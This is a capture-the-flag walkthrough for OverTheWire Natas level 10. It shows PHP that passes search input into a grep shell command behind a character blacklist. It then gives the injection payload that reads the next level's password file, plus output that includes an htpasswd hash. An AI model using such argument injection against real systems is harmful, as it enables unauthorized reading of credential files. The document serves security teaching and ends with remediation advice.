> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                    |
| -------- | -------------------------------------------------------- |
| URL      | `http://natas10.natas.labs.overthewire.org`              |
| Username | `natas10`                                                |
| Password | *found in [Natas Level 8 → 9](natas-level-8-level-9.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **`grep`** — used as the weapon, not the target

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas10.natas.labs.overthewire.org` and log in with the password from Level 9.

The page looks identical to the previous level: a search box and a **View sourcecode** link. Click it.

---

### Step 2 — Read the Source Code

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The structure is the same as Level 9 — user input is embedded in a `grep` command and executed via `passthru()`. The difference is one new check:

```php
if(preg_match('/[;|&]/',$key))
```

The characters used to chain shell commands in the previous level are now blocked. If any appear in the input, the server rejects it without running anything.

This is a blacklist. The filter attempts to enumerate dangerous characters and block them. The problem with blacklists is that they must be exhaustive, they fail the moment an attacker finds a character or technique they did not anticipate.

---

### Understand the Blacklist's Blind Spot

The filter blocks command-chaining characters, but the input is still passed directly into a `grep` command:

```bash
grep -i <your input> dictionary.txt
```

`grep` accepts multiple file arguments. Its syntax is:

```bash
grep [options] pattern file1 file2 ...
```

If you supply a pattern followed by a file path, `grep` searches that file too. The `dictionary.txt` at the end of the hardcoded command is just another file argument — you can inject additional arguments before it by controlling the pattern and inserting a file path.

The `#` character starts a comment in bash. Everything after `#` on the same line is ignored by the shell. That means you can use `#` to neutralise the trailing `dictionary.txt` argument the server appends, without using any of the three blocked characters.

None of `;`, `|`, or `&` are needed. The injection abuses `grep`'s own argument handling, not shell command chaining.

---

### Step 3 — Construct the Payload

The goal is to make the server run:

```bash
grep -i .* /etc/natas_webpass/natas11 #dictionary.txt
```

Breaking it down:

- `.*` is a regex pattern that matches every line — it tells `grep` to print the entire file
- `/etc/natas_webpass/natas11` is the file to search
- `#` comments out everything after it, neutralising the hardcoded `dictionary.txt`

The input to submit in the search box:

```
.* /etc/natas_webpass/natas11 #
```

No semicolons, no pipes, no ampersands. The filter passes it through. `grep` reads the password file and prints its contents to the page.

---

### Step 4 — Submit and Read the Output

Enter the payload in the search box and submit. The page outputs the contents of `/etc/natas_webpass/natas11`:

```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$VJjr.U8g$rg96uDfU6D50BUeY5Fvcx.
/etc/natas_webpass/natas11:<password>
```

That is the password for [Natas Level 10 → 11](natas-level-10-level-11.md).

---

## Key Takeaways

- **Blacklists are fragile.** A filter that blocks `;`, `|`, and `&` feels thorough — but those are not the only ways to exploit unsanitised shell input. Any approach that enumerates "bad" characters will miss something. Whitelisting (allowing only known-safe input) is the correct model, not blacklisting.
- **You don't need to chain commands if the existing command does the job.** The injection here doesn't break out of `grep` at all — it feeds `grep` an extra file argument. Understanding what the target command actually does often reveals a cleaner attack than brute-forcing the filter.
- **`#` is a shell comment character.** It neutralises everything after it on the same line without any of the blocked characters. It is a standard tool for cleaning up payloads when you cannot control what the application appends to your input.
- **The root vulnerability is identical to Level 9.** Filters give the illusion of safety without addressing the underlying problem: user input should never be embedded directly in a shell command. `escapeshellarg()` or avoiding `passthru()` entirely would have prevented both levels.

---